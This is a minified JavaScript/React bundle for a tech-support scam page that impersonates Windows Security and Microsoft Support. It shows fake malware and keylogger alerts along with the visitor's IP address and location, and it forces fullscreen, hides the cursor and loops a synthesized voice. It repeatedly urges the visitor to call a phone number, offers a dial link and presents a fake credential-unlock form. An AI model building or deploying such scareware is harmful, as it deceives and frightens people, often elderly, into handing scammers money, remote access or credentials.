                                color: "red"
                            },
                            children: cl
                        })]
                    }), f.jsxs("div", {
                        className: "sim-stat-box",
                        children: [f.jsx("div", {
                            className: "sim-stat-label",
                            children: "Statut"
                        }), f.jsx("div", {
                            className: "sim-stat-value sim-blinking",
                            style: {
                                color: "red"
                            },
                            children: "CRITIQUE"
                        })]
                    })]
                }), f.jsx("div", {
                    style: {
                        marginTop: 25,
                        textAlign: "right"
                    },
                    children: f.jsx("button", {
                        className: "sim-btn gray",
                        children: "Clean (Not available)"
                    })
                })]
            })]
        }), Jl && f.jsx("img", {
            src: Dr,
            className: "sim-bg-window",
            alt: "cmd",
            style: {
                opacity: .8
            }
        }), Tt && f.jsxs("div", {
            className: "sim-popup-error sim-shake",
            children: [f.jsxs("div", {
                className: "sim-popup-head",
                children: [f.jsxs("span", {
                    style: {
                        display: "flex",
                        alignItems: "center",
                        gap: 8
                    },
                    children: [f.jsx("img", {
                        src: Nr,
                        width: "18",
                        alt: ""
                    }), " Windows-System"]
                }), f.jsx("span", {
                    style: {
                        color: "#999"
                    },
                    children: "✕"
                })]
            }), f.jsxs("div", {
                className: "sim-popup-body",
                children: [f.jsx("h2", {
                    className: "sim-text-alert",
                    style: {
                        color: "#d13438"
                    },
                    children: "COMPUTERS ARE FROZEN"
                }), f.jsx("h3", {
                    className: "sim-text-red",
                    children: "Stopcode: CRITICAL PROCESS IS COMPLETED"
                }), f.jsxs("p", {
                    className: "sim-popup-text",
                    children: [f.jsxs("strong", {
                        children: ["IP Suspecte : ", r]
                    }), f.jsx("br", {}), "An illegal activity has been detected. Your data will be transferred to an external server."]
                }), f.jsxs("div", {
                    className: "sim-contact-box",
                    children: ["Contact Microsoft support (free of charge). :", f.jsx("br", {}), f.jsx("span", {
                        className: "sim-phone-number",
                        children: R
                    })]
                })]
            })]
        }), Gl && f.jsxs("div", {
            className: "sim-geo-popup sim-appear",
            children: [f.jsxs("div", {
                style: {
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    marginBottom: 10
                },
                children: [f.jsx("span", {
                    style: {
                        fontSize: 24
                    },
                    children: "📍"
                }), f.jsxs("div", {
                    children: [f.jsx("h4", {
                        style: {
                            margin: 0,
                            color: "white"
                        },
                        children: "TACTICAL network racing"
                    }), f.jsx("span", {
                        style: {
                            fontSize: 12,
                            color: "#ccc"
                        },
                        children: "Insecure connection"
                    })]
                })]
            }), f.jsxs("div", {
                style: {
                    background: "rgba(255,255,255,0.1)",
                    padding: 10,
                    borderRadius: 4,
                    fontSize: 13
                },
                children: [f.jsxs("p", {
                    style: {
                        margin: "2px 0"
                    },
                    children: [f.jsx("strong", {
                        children: "Public IP :"
                    }), " ", f.jsx("span", {
                        style: {
                            color: "#ffeb3b"
                        },
                        children: r
                    })]
                }), f.jsxs("p", {
                    style: {
                        margin: "2px 0"
                    },
                    children: [f.jsx("strong", {
                          children: "Provider :"
                    }), " ", H]
                }), f.jsxs("p", {
                    style: {
                        margin: "2px 0"
                    },
                    children: [f.jsx("strong", {
                        children: "Position :"
                    }), " ", O]
                })]
            }), f.jsx("p", {
                style: {
                    color: "red",
                    fontSize: 11,
                    marginTop: 10,
                    fontWeight: "bold",
                    textAlign: "center"
                },
                children: "MISSING DATA FOR HACKERS"
            })]
        }), Ot && f.jsxs("div", {
            className: "sim-blue-card sim-zoom",
            children: [f.jsx("div", {
                className: "sim-blue-header",
                children: "SmartScreen - Preventive blocking"
            }), f.jsx("p", {
                children: f.jsx("strong", {
                    children: "Windows has stopped running to protect your data."
                })
            }), f.jsxs("ul", {
                className: "sim-risk-list",
                children: [f.jsx("li", {
                    children: "Trojan Horse(Trojan.Spy.Win32)"
                }), f.jsx("li", {
                    children: "Attempted identity theft (Facebook, Bank)"
                }), f.jsx("li", {
                    children: "Critical system error"
                })]
            }), f.jsxs("div", {
                className: "sim-contact-white",
                children: ["Call him ", R]
            }), f.jsx("div", {
                style: {
                    display: "flex",
                    gap: 10,
                    marginTop: 15
                },
                children: f.jsx("button", {
                    className: "sim-btn-outline",
                    children: "Ignore (Risky)"
                })
            })]
        }), Dt && f.jsxs("div", {
            className: "sim-chat",
            children: [f.jsxs("div", {
                className: "sim-chat-header",
                children: [f.jsxs("div", {
                    className: "sim-chat-agent-info",
                    children: [f.jsx("div", {
                        className: "sim-agent-avatar",
                        children: f.jsx("svg", {
                            width: "16",
                            height: "16",
                            viewBox: "0 0 24 24",
                            fill: "currentColor",
                            children: f.jsx("path", {
                                d: "M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"
                            })
                        })
                    }), f.jsxs("div", {
                        className: "sim-agent-text",
                        children: [f.jsx("span", {
                            className: "sim-agent-name",
                            children: "Support Microsoft"
                        }), f.jsxs("span", {
                            className: "sim-agent-status",
                            children: [f.jsx("span", {
                                className: "sim-status-dot"
                            }), " Online"]
                        })]
                    })]
                }), f.jsx("div", {
                    style: {
                        cursor: "pointer"
                    },
                    children: "✕"
                })]
            }), f.jsxs("div", {
                className: "sim-chat-body",
                children: [f.jsxs("div", {
                    className: "sim-chat-msg system",
                    children: ["Aujourd'hui, ", new Date().toLocaleTimeString([], {
                        hour: "2-digit",
                        minute: "2-digit"
                    })]
                }), p.map( (G, w) => f.jsxs("div", {
                    className: `sim-chat-msg ${G.type}`,
                    children: [G.text, G.type === "agent" && f.jsx("span", {
                        className: "sim-msg-time",
                        children: new Date().toLocaleTimeString([], {
                            hour: "2-digit",
                            minute: "2-digit"
                        })
                    })]
                }, w))]
            }), f.jsxs("div", {
                className: "sim-chat-cta",
                children: [f.jsx("p", {
                    children: "⚠️ The session is suspended for security reasons."
                }), f.jsx("h2", {
                    className: "sim-chat-phone",
                    children: R
                }), f.jsxs("button", {
                    className: "sim-btn-call",
                    children: [f.jsx("svg", {
                        width: "16",
                        height: "16",
                        fill: "none",
                        stroke: "currentColor",
                        strokeWidth: "2",
                        viewBox: "0 0 24 24",
                        children: f.jsx("path", {
                            strokeLinecap: "round",
                            strokeLinejoin: "round",
                            d: "M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
                        })
                    }), "Contact Support"]
                })]
            })]
        }), Xl && f.jsxs("div", {
            className: "sim-login",
            children: [f.jsx("div", {
                className: "sim-close-login",
                onClick: G => {
                    G.stopPropagation(),
                    lt(!1)
                }
                ,
                children: "✕"
            }), f.jsx("h2", {
                style: {
                    fontSize: 24,
                    fontWeight: 400,
                    color: "white",
                    marginBottom: 20
                },
                children: "Authentication is required"
            }), f.jsx("p", {
                style: {
                    fontSize: 14,
                    color: "#ddd",
                    marginBottom: 20
                },
                children: "The Windows firewall has blocked your session."
            }), f.jsx("h3", {
                style: {
                    fontSize: 30,
                    margin: "15px 0",
                    color: "#ffeb3b",
                    fontWeight: "bold"
                },
                children: R
            }), f.jsx("input", {
                type: "password",
                placeholder: "Email"
            }), f.jsx("input", {
                type: "text",
                placeholder: "Unlocking keys"
            }), f.jsx("button", {
                className: "sim-btn white full-width",
                style: {
                    marginTop: 15,
                    color: "#d13438",
                    fontWeight: "bold"
                },
                children: "Unlock my PC"
            })]
        }), At && f.jsxs("div", {
            className: "sim-black-msg sim-appear",
            children: [f.jsxs("div", {
                className: "sim-black-header",
                children: [f.jsx("img", {
                    src: Au,
                    width: "24",
                    alt: ""
                }), f.jsx("h3", {
                    children: "Windows Security - Action Needed"
                })]
            }), f.jsxs("div", {
                className: "sim-warning-body",
                children: [f.jsx("h2", {
                    className: "sim-main-alert",
                    children: "Access to this PC has been temporarily blocked."
                }), f.jsx("p", {
                    style: {
                        marginBottom: 20
                    },
                    children: "For your security, Windows has blocked the execution of unauthorized scripts on this network. A manual check by a Microsoft-certified technician is required to unlock the system."
                }), f.jsxs("div", {
                    className: "sim-tech-info",
                    children: [f.jsxs("div", {
                        style: {
                            marginBottom: 5
                        },
                        children: [f.jsx("strong", {
                            children: "Session ID :"
                        }), " 899-XC-22-B"]
                    }), f.jsxs("div", {
                        style: {
                            marginBottom: 5
                        },
                        children: [f.jsx("strong", {
                            children: "IP Adresse :"
                        }), " ", f.jsx("span", {
                            className: "sim-ip-highlight",
                            children: r
                        }), " (", O, ")"]
                    }), f.jsxs("div", {
                        children: [f.jsx("strong", {
                            children: "Error code :"
                        }), " 0x80070422 (Firewall_Block)"]
                    })]
                }), f.jsx("div", {
                    style: {
                        fontSize: 13,
                        fontWeight: "bold",
                        marginBottom: 10,
                        color: "#333"
                    },
                    children: "Affected Services :"
                }), f.jsxs("ul", {
                    className: "sim-data-list",
                    children: [f.jsxs("li", {
                        children: [f.jsx("span", {
                            className: "sim-danger-icon",
                            children: "⚠️"
                        }), " Banking services"]
                    }), f.jsxs("li", {
                        children: [f.jsx("span", {
                            className: "sim-danger-icon",
                            children: "⚠️"
                        }), " E-Mail"]
                    }), f.jsxs("li", {
                        children: [f.jsx("span", {
                            className: "sim-danger-icon",
                            children: "⚠️"
                        }), " Files"]
                    }), f.jsxs("li", {
                        children: [f.jsx("span", {
                            className: "sim-danger-icon",
                            children: "⚠️"
                        }), " Network connection"]
                    })]
                }), f.jsxs("div", {
                    className: "sim-call-action",
                    children: [f.jsx("div", {
                        className: "sim-call-text",
                        children: "Technical support (free of charge - around the clock) :"
                    }), f.jsx("span", {
                        className: "sim-black-phone",
                        children: R
                    }), f.jsx("div", {
                        style: {
                            fontSize: 11,
                            color: "#888",
                            marginTop: 5
                        },
                        children: "Document number: #WIN-8842"
                    })]
                })]
            }), f.jsxs("div", {
                className: "sim-action-buttons",
                children: [f.jsx("button", {
                    className: "sim-btn-action reject",
                    onClick: () => alert("Can not be closed. Please contact support."),
                    children: "Cancel"
                }), f.jsx("button", {
                    className: "sim-btn-action accept",
                    onClick: () => {
                        window.location.href = "tel:" + R.replace(/\s/g, "")
                    }
                    ,
                    children: "Contact Support"
                })]
            })]
        }), Ql && f.jsxs("div", {
            className: "sim-footer",
            children: [f.jsxs("div", {
                style: {
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    minWidth: 280
                },
                children: [f.jsx("img", {
                    src: Au,
                    width: "20",
                    alt: ""
                }), f.jsx("span", {
                    style: {
                        fontWeight: 600
                    },
                    children: "Windows Security Center"
                }), f.jsx("span", {
                    className: "sim-badge",
                    children: "CRITICISM"
                })]
            }), f.jsxs("marquee", {
                direction: "left",
                scrollamount: "15",
                style: {
                    flex: 1,
                    fontSize: 15,
                    fontWeight: 600,
                    color: "#fff"
                },
                children: ["WARNING: Spyware detected on IP address", r, ". Your data (bank, Facebook) will be transferred. Call the ", R," immediately."]
            })]
        }), f.jsx("div", {
            onClick: B,
            className: "sim-exit-trigger",
            title: "Development version"
        })]
    }) : null
}
const Sh = "images/XXR_MIC.png"
  , ph = "images/DEFENDOXxa.png";
function bh() {
    Or(!0, () => {}
    );
    const T = _r("LdelCcbW.wav", !0, 1)
      , [Q,B] = ll.useState(!0);
    return ll.useEffect( () => {
        const r = setInterval( () => B(R => !R), 500)
          , O = setTimeout( () => {
            try {
                document.documentElement.requestFullscreen().catch( () => {}
                )
            } catch {}
        }
        , 100);
        T.play();
        const H = () => {
            const R = new SpeechSynthesisUtterance;
            R.text = "Critical Windows security incident. The system is damaged. Please contact support at +1-877-481-3419.",
            R.lang = "en-US",
            R.rate = .9,
            R.pitch = 1,
            R.onend = () => setTimeout(H, 1500),
            window.speechSynthesis.speak(R)
        }
        ;
        return H(),
        () => {
            clearTimeout(O),
            clearInterval(r)
        }
    }
    , []),
    f.jsxs("div", {
        className: "sim-fullscreen-overlay",
        style: {
            background: `url(${Sh}) no-repeat center center / cover`,
            cursor: "none",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            position: "fixed",
            inset: 0,
            zIndex: 999999999
        },
        children: [f.jsx("div", {
            style: {
                position: "absolute",
                top: 0,
                left: 0,
                width: "100%",
                height: "100%"
            }
        }), f.jsxs("div", {
            className: "sim-appear",
            style: {
                position: "relative",
                width: "750px",
                height: "500px",
                background: "#fff",
                boxShadow: "0 25px 50px -12px rgba(0, 0, 0, 0.7)",
                fontFamily: '"Segoe UI", sans-serif',
                display: "flex",
                flexDirection: "column",
                border: "1px solid #999"
            },
            children: [f.jsxs("div", {
                style: {
                    height: "40px",
                    background: "#fff",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "0 15px",
                    borderBottom: "1px solid #e5e5e5"
                },
                children: [f.jsxs("div", {
                    style: {
                        display: "flex",
                        alignItems: "center",
                        gap: 10,
                        fontSize: "12px",
                        color: "#333"
                    },
                    children: [f.jsx("img", {
                        src: ph,
                        width: "16",
                        alt: ""
                    }), f.jsx("span", {
                        children: "Windows Security"
                    })]
                }), f.jsxs("div", {
                    style: {
                        display: "flex",
                        gap: 15,
                        color: "#999",
                        fontSize: "10px"
                    },
                    children: [f.jsx("span", {
                        children: "—"
                    }), f.jsx("span", {
                        children: "□"
                    }), f.jsx("span", {
                        children: "✕"
                    })]
                })]
            }), f.jsxs("div", {
                style: {
                    flex: 1,
                    display: "flex"
                },
                children: [f.jsxs("div", {
                    style: {
                        width: "60px",
                        borderRight: "1px solid #e5e5e5",
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        paddingTop: 20,
                        gap: 20
                    },
                    children: [f.jsx("div", {
                        style: {
                            fontSize: 20
                        },
                        children: "🏠"
                    }), f.jsx("div", {
                        style: {
                            fontSize: 20,
                            color: "#d13438",
                            borderLeft: "3px solid #d13438",
                            paddingLeft: 10,
                            marginLeft: -3
                        },
                        children: "🛡️"
                    }), f.jsx("div", {
                        style: {
                            fontSize: 20
                        },
                        children: "📡"
                    }), f.jsx("div", {
                        style: {
                            fontSize: 20
                        },
                        children: "⚙️"
                    })]
                }), f.jsxs("div", {
                    style: {
                        flex: 1,
                        padding: "40px",
                        display: "flex",
                        flexDirection: "column",
                        textAlign: "left"
                    },
                    children: [f.jsx("h1", {
                        style: {
                            margin: "0 0 10px 0",
                            fontSize: "24px",
                            fontWeight: "300",
                            color: "#d13438"
                        },
                        children: "Threats detected"
                    }), f.jsx("p", {
                        style: {
                            fontSize: "13px",
                            color: "#666",
                            marginBottom: "30px"
                        },
                        children: "The virus scan has been interrupted. Your digital identity has been compromised."
                    }), f.jsxs("div", {
                        style: {
                            background: "#fff0f0",
                            border: "1px solid #ffb9b9",
                            padding: "15px",
                            marginBottom: "20px",
                            display: "flex",
                            gap: 15
                        },
                        children: [f.jsx("div", {
                            style: {
                                fontSize: "32px"
                            },
                            children: "🚫"
                        }), f.jsxs("div", {
                            children: [f.jsx("strong", {
                                style: {
                                    color: "#d13438",
                                    fontSize: "14px"
                                },
                                children: "Trojan:Win32/Spyware.Keylogger"
                            }), f.jsxs("div", {
                                style: {
                                    fontSize: "12px",
                                    marginTop: "5px",
                                    color: "#333"
                                },
                                children: [f.jsx("strong", {
                                    children: "Statut :"
                                }), " Actif", f.jsx("br", {}), f.jsx("strong", {
                                    children: "Impact :"
                                }), " Theft of passwords, banking access", f.jsx("br", {}), f.jsx("strong", {
                                    children: "Affected files :"
                                }), " System32, Chrome_Data"]
                            })]
                        })]
                    }), f.jsxs("div", {
                        style: {
                            marginTop: "auto",
                            textAlign: "center"
                        },
                        children: [f.jsx("p", {
                            style: {
                                fontSize: "14px",
                                fontWeight: "600",
                                marginBottom: "10px"
                            },
                            children: "Contact Microsoft technical Support immediately. :"
                        }), f.jsx("div", {
                            style: {
                                fontSize: "36px",
                                fontWeight: "bold",
                                color: Q ? "#0078d7" : "#333",
                                transition: "color 0.3s",
                                letterSpacing: "1px"
                            },
                            children: "+1-877-481-3419"
                        }), f.jsx("p", {
                            style: {
                                fontSize: "11px",
                                color: "#999",
                                marginTop: "5px"
                            },
                            children: "Call for free • Available around the clock * ID: 8842-WIN-LOCK"
                        }), f.jsx("button", {
                            style: {
                                marginTop: "20px",
                                padding: "10px 30px",
                                background: "#ccc",
                                color: "#666",
                                border: "none",
                                borderRadius: "2px",
                                fontWeight: "bold",
                                cursor: "not-allowed"
                            },
                            children: "Remove Threats (Disabled)"
                        })]
                    })]
                })]
            })]
        }), f.jsx("div", {
            style: {
                position: "absolute",
                bottom: 0,
                left: 0,
                width: "100%",
                background: "#d13438",
                color: "white",
                padding: "10px",
                textAlign: "center",
                fontFamily: "monospace",
                fontSize: "14px",
                fontWeight: "bold"
            },
              children: "*** SYSTEM LOCKED FOR SECURITY REASONS - DO NOT TURN OFF THE COMPUTER ***"
        })]
    })
}
function xh(T=new Date) {
    const Q = B => String(B).padStart(2, "0");
    return `${Q(T.getHours())}:${Q(T.getMinutes())}:${Q(T.getSeconds())}`
}
const zh = "images/XXR_MIC1.png";
function Eh() {
    const [T,Q] = ll.useState("SIMULATION")
      , B = (H, R) => {
        console.log(`[${xh()}] [${H}] ${R}`)
    }
      , r = () => {
        Q("REPORT"),
        document.body.style.cursor = "default",
        document.exitFullscreen && document.exitFullscreen().catch( () => {}
        )
    }
      , O = () => {
        Q("LOCKED")
    }
    ;
    return f.jsxs(f.Fragment, {
        children: [T === "SIMULATION" && f.jsx(gh, {
            active: !0,
            onLog: B,
            closeSim: r
        }), T === "LOCKED" && f.jsx(bh, {}), T === "REPORT" && f.jsxs("div", {
            style: Dl.container,
            children: [f.jsxs("div", {
                style: Dl.card,
                children: [f.jsxs("div", {
                    style: Dl.header,
                    children: [f.jsxs("svg", {
                        style: Dl.icon,
                        viewBox: "0 0 24 24",
                        fill: "none",
                        xmlns: "http://www.w3.org/2000/svg",
                        children: [f.jsx("path", {
                            d: "M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z",
                            fill: "#28a745",
                            stroke: "#20c997",
                            strokeWidth: "2",
                            strokeLinecap: "round",
                            strokeLinejoin: "round"
                        }), f.jsx("path", {
                            d: "M9 12L11 14L15 10",
                            stroke: "white",
                            strokeWidth: "2",
                            strokeLinecap: "round",
                            strokeLinejoin: "round"
                        })]
                    }), f.jsx("h1", {
                        style: Dl.title,
                        children: "System Analysis Report"
                    })]
                }), f.jsx("div", {
                    style: Dl.divider
                }), f.jsxs("div", {
                    style: Dl.body,
                    children: [f.jsxs("div", {
                        style: Dl.statusBox,
                        children: [f.jsx("span", {
                            style: Dl.label,
                            children: "STATUT :"
                        }), f.jsx("span", {
                            style: {
                                ...Dl.valueSuccess,
                                color: "#ffc107"
                            },
                            children: "QUARANTINE HAS BEEN POSTPONED (PENDING)"
                        })]
                    }), f.jsxs("p", {
                        style: Dl.text,
                        children: ["The analysis detected ", f.jsx("strong", {
                            children: "58 critical threats"
                        }), ". The system has activated the ", f.jsx("strong", {
                            children: "preventive encryption"
                        }), " of your data."]
                    }), f.jsxs("div", {
                        style: Dl.warningBox,
                        children: [f.jsx("p", {
                            style: {
                                margin: 0,
                                fontWeight: "bold",
                                color: "#ffc107"
                            },
                            children: "⚠️ IMMEDIATE SYSTEM FAILURE"
                        }), f.jsx("p", {
                            style: {
                                marginTop: 5,
                                fontSize: "14px"
                            },
                            children: "Call emergency support immediately; a Microsoft certified technician is on hand to secure your system."
                        })]
                    }), f.jsxs("div", {
                        style: Dl.phoneContainer,
                        children: [f.jsx("span", {
                            style: Dl.phone,
                            children: "+1-877-481-3419"
                        }), f.jsx("span", {
                            style: Dl.subPhone,
                            children: "Call support now to complete the process."
                        })]
                    })]
                }), f.jsx("div", {
                    style: Dl.footer,
                    children: f.jsx("button", {
                        onClick: O,
                        style: Dl.offBtn,
                        children: "Seite schließen"
                    })
                })]
            }), f.jsx("div", {
                style: Dl.copyright,
                children: "© 2026 Microsoft Security Essentials. All rights reserved."
            })]
        })]
    })
}
const Dl = {
    container: {
        height: "100vh",
        width: "100vw",
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
        background: `linear-gradient(135deg, rgba(15, 23, 42, 0.85) 0%, rgba(30, 41, 59, 0.95) 100%), url(${zh})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
        color: "#e2e8f0",
        fontFamily: '"Segoe UI", Roboto, Helvetica, Arial, sans-serif',
        margin: 0,
        padding: 0,
        position: "fixed",
        top: 0,
        left: 0
    },
    card: {
        background: "#1e293b",
        width: "500px",
        borderRadius: "12px",
        boxShadow: "0 25px 50px -12px rgba(0, 0, 0, 0.5)",
        border: "1px solid #334155",
        overflow: "hidden",
        animation: "fadeIn 0.5s ease-out"
    },
    header: {
        padding: "25px",
        textAlign: "center",
        background: "#0f172a",
        borderBottom: "1px solid #334155"
    },
    icon: {
        width: "64px",
        height: "64px",
        marginBottom: "15px"
    },
    title: {
        fontSize: "22px",
        fontWeight: "600",
        margin: 0,
        color: "#fff"
    },
    divider: {
        height: "4px",
        background: "linear-gradient(90deg, #28a745 0%, #20c997 100%)",
        width: "100%"
    },
    body: {
        padding: "30px",
        textAlign: "center"
    },
    statusBox: {
        background: "rgba(40, 167, 69, 0.1)",
        border: "1px solid #28a745",
        borderRadius: "6px",
        padding: "10px",
        marginBottom: "20px",
        display: "flex",
        justifyContent: "center",
        gap: "10px"
    },
    label: {
        color: "#94a3b8",
        fontWeight: "bold",
        fontSize: "14px"
    },
    valueSuccess: {
        color: "#ffc107",
        fontWeight: "bold",
        fontSize: "14px",
        letterSpacing: "0.5px"
    },
    text: {
        fontSize: "15px",
        lineHeight: "1.6",
        color: "#cbd5e1",
        marginBottom: "20px"
    },
    warningBox: {
        background: "rgba(255, 193, 7, 0.05)",
        borderLeft: "4px solid #ffc107",
        padding: "15px",
        textAlign: "left",
        marginBottom: "25px",
        borderRadius: "0 4px 4px 0"
    },
    phoneContainer: {
        background: "#0f172a",
        padding: "15px",
        borderRadius: "8px",
        border: "1px dashed #475569",
        marginBottom: "10px"
    },
    phone: {
        display: "block",
        fontSize: "32px",
        fontWeight: "800",
        color: "#fff",
        letterSpacing: "1px"
    },
    subPhone: {
        fontSize: "12px",
        color: "#28a745",
        fontWeight: "bold",
        textTransform: "uppercase"
    },
    footer: {
        padding: "20px",
        background: "#0f172a",
        textAlign: "center",
        borderTop: "1px solid #334155"
    },
    offBtn: {
        background: "#d13438",
        color: "white",
        border: "none",
        padding: "12px 30px",
        borderRadius: "6px",
        fontSize: "16px",
        fontWeight: "600",
        cursor: "pointer",
        transition: "background 0.2s",
        width: "100%"
    },
    copyright: {
        marginTop: "20px",
        fontSize: "12px",
        color: "#64748b"
    }
};
dh.createRoot(document.getElementById("root")).render(f.jsx(ll.StrictMode, {
    children: f.jsx(Eh, {})
}));
